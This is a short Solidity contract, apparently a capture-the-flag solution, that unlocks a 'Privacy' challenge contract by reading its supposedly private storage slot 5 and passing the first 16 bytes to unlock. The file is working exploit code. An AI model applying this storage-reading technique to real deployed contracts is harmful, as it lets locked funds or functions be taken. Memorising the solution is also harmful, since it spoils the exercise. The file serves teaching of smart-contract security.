import "src/Privacy/Privacy.sol";
import "exploits/BlockUtils.sol";

contract PrivacyExploit is BlockUtils {

    Privacy victim;

    constructor(address _victim) {
        victim = Privacy(payable(_victim));
    }

    function hack() public {
        // Read storage slot 5 which contains data[2]
        bytes32 storageValue = peekStorage(address(victim), 5);
        // Extract the first 16 bytes as the key
        bytes16 key = bytes16(storageValue);
        // Call the unlock function with the extracted key
        victim.unlock(key);
    }

    receive() external payable {}
}